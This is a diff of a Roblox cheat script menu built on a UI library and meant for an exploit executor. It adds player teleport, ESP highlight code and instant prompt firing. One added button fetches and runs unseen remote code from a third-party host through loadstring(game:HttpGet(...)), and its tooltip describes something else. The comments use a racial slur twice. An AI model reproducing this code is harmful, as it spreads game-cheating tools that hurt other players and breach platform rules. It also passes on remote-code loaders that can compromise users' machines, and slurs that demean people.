@@ -25,8 +25,36 @@ notes:
  - i need to add waypoints that can be chozen and then saved/executed to teleport to places
  - i need to make log content be inside some doccument that can be edited later without changing the script
 ]]--
+
+task.spawn(pcall, startergui.SetCore, startergui, "SendNotification", {
+    Title = "Loading script",
+    Text = "make sure to join .gg/arA7TyReHP for help",
+    Duration = 3,
+    Button1 = "w"
+})
+
+local UserInputService = game:GetService("UserInputService")
+local Mouse = LocalPlayer:GetMouse()
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
 local http = game:GetService("HttpService")
 local RunService = game:GetService("RunService")
+local function tpToUsername(username)
+	local target = Players:FindFirstChild(username)
+	if not target then return end
+
+	local myChar = LocalPlayer.Character
+	local tgtChar = target.Character
+	if not myChar or not tgtChar then return end
+
+	local myRoot = myChar:FindFirstChild("HumanoidRootPart")
+	local tgtRoot = tgtChar:FindFirstChild("HumanoidRootPart")
+	if not myRoot or not tgtRoot then return end
+
+	myRoot.CFrame = tgtRoot.CFrame * CFrame.new(0, 0, -3)
+end
+
+
 
 local repo = "https://raw.githubusercontent.com/deividcomsono/Obsidian/main/"
 local Library = loadstring(game:HttpGet(repo .. "Library.lua"))()
@@ -55,38 +83,16 @@ local Tabs = {
 	Setting = Window:AddTab("UI Settings", "settings"),
 }
 
-
-local ProximityPromptService = game:GetService("ProximityPromptService")
-local instantInteractEnabled = true
-
-ProximityPromptService.PromptButtonHoldBegan:Connect(function(prompt, player)
-	if instantInteractEnabled then
-    	fireproximityprompt(prompt)
-	end
-end)
-
-local pingMs = math.floor(player:GetNetworkPing() * 1000)
-RunService.RenderStepped:Connect(function(dt)
-    fpss = math.floor(1 / dt)
-end)
-Library:PingLabel("ping: " .. pingMs .. " ms")
-Library:PingLabel("fps: " .. fpss)
-
 ----------------log tab------------
-local logurl = "https://raw.githubusercontent.com/evilave/evilave/main/log.txt"
-local success, result = pcall(function()
-    return http:GetAsync(logurl)
-end)
+local HttpService = game:GetService("HttpService")
 
-if success then
-    Announcement = result
-else
-    Announcement = "Failed to load update log."
-end
+ Announcement = HttpService:GetAsync(
+    "https://raw.githubusercontent.com/evilave/evilave/main/log.txt",
+    true
+)
+Announcement = Announcement:gsub("%s+$", "")
 
 
-
---" --- 11 feb 2026\n [+] added more stuff to skids tab\n [+] started working to improve exec tab\n [!] im kinda out of motivation to continue :/\n [!] also my 'friend' tried stealing the src, now i learnt my lesson to obf\n\n --- 23 jan 2026\n [+] Used ob lib\n [+] added contents in tab with scripts\n [+] started working on local player\n [+] fixed key"
 local LogGroupBox = Tabs.Log:AddLeftGroupbox("Update Log")
 LogGroupBox:AddLabel(
 	Announcement,
@@ -137,6 +143,88 @@ LeftGroupBox3:AddInput("JumpPower", {
 })
 
 
+local TpBox = Tabs.Locale:AddRightGroupbox("Teleport", "map-pin")
+TpBox:AddDropdown("PlayerTpDropdown", {
+	SpecialType = "Player",
+	Tooltip = "Pick any player you want to tp to",
+	ExcludeLocalPlayer = true,
+	Text = "Select a player",
+	Callback = function(Value)
+		local username
+		if typeof(Value) == "Instance" and Value:IsA("Player") then
+			username = Value.Name
+		elseif typeof(Value) == "string" then
+			username = Value
+		else
+			return
+		end
+		tpToUsername(username)
+	end,
+})
+
+TpBox:AddToggle("CursorTP", {
+	Text = "T to TP on cursor pos",
+	Tooltip = "TP to your cursor position when T is pressed",
+	DisabledTooltip = "disabled",
+
+	Callback = function(Value)
+		print("[cb] MyToggle changed to:", Value)
+	end,
+})
+
+
+local VisualsBox = Tabs.Locale:AddLeftGroupbox("Visuals", "scan-eye")
+VisualsBox:AddToggle("Esp outlines", {
+	Text = "esp the outline of every player",
+	Tooltip = "does not have usernames, distance or health info.",
+	DisabledTooltip = "disabled",
+
+	Callback = function(Value)
+		print("[cb] MyToggle changed to:", Value)
+	end,
+})
+--nigger make esp
+--[[esp script
+
+local S, P, C3 = setmetatable({}, {__index = function(_,k) return game:GetService(k) end}), game:GetService("Players"), Color3.fromRGB
+local LP, Tag, Cons = P.LocalPlayer, "evxve", {}
+
+if _G.UnloadChams then _G.UnloadChams() end
+
+local Cfg = {Enemy=C3(180,40,40), Ally=C3(40,180,80), FillTr=0.5, OutTr=0.1, TeamCheck=true}
+
+local function Paint(Chr, Plr)
+    if not Chr or Chr:FindFirstChild(Tag) then return end
+    local H = Instance.new("Highlight")
+    local IsEnemy = (Cfg.TeamCheck and Plr.Team ~= LP.Team) or not Cfg.TeamCheck
+    
+    H.Name, H.FillColor, H.OutlineColor = Tag, IsEnemy and Cfg.Enemy or Cfg.Ally, C3(255,255,255)
+    H.FillTransparency, H.OutlineTransparency = Cfg.FillTr, Cfg.OutTr
+    H.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+    H.Adornee, H.Parent = Chr, Chr
+end
+
+local function Hook(Plr)
+    if Plr == LP then return end
+    Cons[Plr] = Plr.CharacterAdded:Connect(function(c) task.wait(0.1); Paint(c, Plr) end)
+    if Plr.Character then Paint(Plr.Character, Plr) end
+end
+
+for _, v in next, P:GetPlayers() do Hook(v) end
+Cons.Add = P.PlayerAdded:Connect(Hook)
+
+_G.UnloadChams = function()
+    if Cons.Add then Cons.Add:Disconnect() end
+    for _, c in next, Cons do if c.Disconnect then c:Disconnect() end end
+    for _, v in next, P:GetPlayers() do if v.Character and v.Character:FindFirstChild(Tag) then v.Character[Tag]:Destroy() end end
+    _G.UnloadChams = nil
+end
+
+
+
+
+
+]]
 ------------scripts tab------------
 
 local LeftGroupBox = Tabs.Skids:AddLeftGroupbox("Universal", "code-xml")
@@ -234,6 +322,17 @@ local LagButton = GodButton:AddButton({ -- twin
 	DisabledTooltip = "disabled.",
 })
 
+local ChatButton = LeftGroupBox:AddButton({ -- single
+	Text = "chat",
+	Func = function()
+		_G.CHAT = true
+		loadstring(game:HttpGet('https://catroman05.alwaysdata.net/loader'))()
+	end,
+	DoubleClick = false,
+	Tooltip = "Ignore touch interests | usefull to not interact with killbricks etc.",
+	DisabledTooltip = "disabled.",
+})
+
 
 
 --not universal no more lol--
@@ -327,12 +426,32 @@ local VoidButton = DownLeftGroupBox:AddButton({ -- single
 local InstaButton = VoidButton:AddButton({ -- twin
 	Text = "inst",
 	Func = function()
-		instantInteractEnabled = true -- fix that (nigger hotfix)
+		local ProximityPromptService = game:GetService("ProximityPromptService")
+		local instantInteractEnabled = true
+
+		ProximityPromptService.PromptButtonHoldBegan:Connect(function(prompt, player)
+    		if instantInteractEnabled then
+        		fireproximityprompt(prompt)
+    		end
+		end)
 	end,
-	DoubleClick = false, -- You will have to click this button twice to trigger the callback
+	DoubleClick = false,
 	Tooltip = "instant interact | makes native hold to interact work faster",
 	DisabledTooltip = "disabled.",
 })
+
+
+local RobuxButton = DownLeftGroupBox:AddButton({ -- single
+	Text = "gpass",
+	Func = function()
+		print("h")
+	end,
+	DoubleClick = false,
+
+	Tooltip = "anti gamepass | doesnt let you buy anything for robux",
+	DisabledTooltip = "disabled.",
+})
+
 
 
 
@@ -893,7 +1012,6 @@ MenuGroup:AddLabel("Menu bind")
 
 
 
----------------------------------------------
 MenuGroup:AddButton("Unload", function()
 	Library:Unload()
 end)
